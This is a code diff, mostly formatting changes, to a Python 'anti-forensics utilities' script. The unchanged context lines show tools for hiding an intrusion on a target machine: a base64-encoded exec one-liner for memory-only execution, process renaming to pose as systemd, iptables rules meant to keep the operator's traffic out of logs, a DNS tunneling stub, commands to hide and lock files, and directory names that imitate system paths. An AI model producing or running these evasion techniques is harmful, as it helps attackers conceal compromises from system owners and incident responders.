@@ -18,15 +18,15 @@ class MemoryOnlyMode:
     """
     Utilities for running operations entirely in memory (no disk writes).
     """
-    
+
     @staticmethod
     def create_ram_disk(size_mb: int = 100) -> str:
         """
         Create a RAM disk for temporary operations.
-        
+
         Args:
             size_mb: Size in megabytes
-        
+
         Returns:
             Path to RAM disk
         """
@@ -35,38 +35,39 @@ class MemoryOnlyMode:
             mount_point = "/tmp/ramdisk"
             commands = [
                 f"mkdir -p {mount_point}",
-                f"mount -t tmpfs -o size={size_mb}m tmpfs {mount_point}"
+                f"mount -t tmpfs -o size={size_mb}m tmpfs {mount_point}",
             ]
             script = " && ".join(commands)
             print(f"[*] Creating RAM disk...")
             print(f"[*] Run this on target (as root): {script}")
             return mount_point
-        
+
         elif sys.platform == "win32":
             # Windows: use ImDisk (if installed)
             print(f"[*] Windows RAM disk requires ImDisk")
             print(f"[*] Download from: https://www.ltr-data.se/opencode.html/#ImDisk")
             return "R:\\"
-        
+
         else:
             print(f"[!] Unsupported platform: {sys.platform}")
             return None
-    
+
     @staticmethod
     def get_memory_only_python_command(script_content: str) -> str:
         """
         Generate a Python command that runs entirely in memory.
-        
+
         Args:
             script_content: Python code to execute
-        
+
         Returns:
             One-liner command
         """
         # Encode script to avoid shell escaping issues
         import base64
+
         encoded = base64.b64encode(script_content.encode()).decode()
-        
+
         command = f"python3 -c \"import base64; exec(base64.b64decode('{encoded}'))\""
         print(f"[*] Memory-only Python command generated")
         print(f"[*] Run this on target: {command}")
@@ -77,12 +78,12 @@ class ProcessHiding:
     """
     Utilities for hiding processes from detection.
     """
-    
+
     @staticmethod
     def rename_process(new_name: str = "systemd") -> str:
         """
         Rename the current process to blend in.
-        
+
         Args:
             new_name: Process name to masquerade as
         """
@@ -91,7 +92,7 @@ class ProcessHiding:
         print(f"[*] Renaming process to: {new_name}")
         print(f"[*] Run this in your shell: {command}")
         return command
-    
+
     @staticmethod
     def hide_from_ps() -> str:
         """
@@ -120,12 +121,12 @@ class NetworkStealth:
     """
     Utilities for hiding network activity.
     """
-    
+
     @staticmethod
     def generate_iptables_rules(your_ip: str) -> str:
         """
         Generate iptables rules to hide your traffic from logs.
-        
+
         Args:
             your_ip: Your IP address
         """
@@ -144,7 +145,7 @@ echo "[+] Stealth rules applied"
 """
         print(f"[*] Generating iptables stealth rules...")
         return script
-    
+
     @staticmethod
     def dns_tunneling_example() -> str:
         """
@@ -170,38 +171,35 @@ class FileHiding:
     """
     Utilities for hiding files and directories.
     """
-    
+
     @staticmethod
     def hide_file_linux(file_path: str) -> List[str]:
         """
         Hide a file on Linux systems.
-        
+
         Args:
             file_path: File to hide
-        
+
         Returns:
             List of commands
         """
         commands = [
             # Method 1: Dot prefix (simple)
             f"mv {file_path} .{os.path.basename(file_path)}",
-            
             # Method 2: Hide in /dev/shm (memory)
             f"cp {file_path} /dev/shm/.{os.path.basename(file_path)}",
-            
             # Method 3: Set immutable attribute
             f"chattr +i {file_path}",
-            
             # Method 4: Hide in /proc (advanced)
-            f"mkdir /proc/.hidden && cp {file_path} /proc/.hidden/"
+            f"mkdir /proc/.hidden && cp {file_path} /proc/.hidden/",
         ]
-        
+
         print(f"[*] File hiding techniques:")
         for i, cmd in enumerate(commands, 1):
             print(f"  {i}. {cmd}")
-        
+
         return commands
-    
+
     @staticmethod
     def create_hidden_directory() -> str:
         """
@@ -211,13 +209,13 @@ class FileHiding:
             "/dev/shm/.cache",  # Memory-based
             "/tmp/....",  # Looks like a typo
             "/var/tmp/.X11-unix",  # Mimics system dir
-            "$HOME/.config/systemd/.user"  # Looks legitimate
+            "$HOME/.config/systemd/.user",  # Looks legitimate
         ]
-        
+
         print(f"[*] Suggested hidden directory locations:")
         for loc in locations:
             print(f"  - {loc}")
-        
+
         return locations[0]
 
 
@@ -227,15 +225,15 @@ if __name__ == "__main__":
     print("ANTI-FORENSICS UTILITIES")
     print("=" * 70)
     print()
-    
+
     print("[1] Memory-Only Mode")
     print("[2] Process Hiding")
     print("[3] Network Stealth")
     print("[4] File Hiding")
     print()
-    
+
     choice = input("Select option (1-4): ")
-    
+
     if choice == "1":
         MemoryOnlyMode.create_ram_disk(100)
     elif choice == "2":
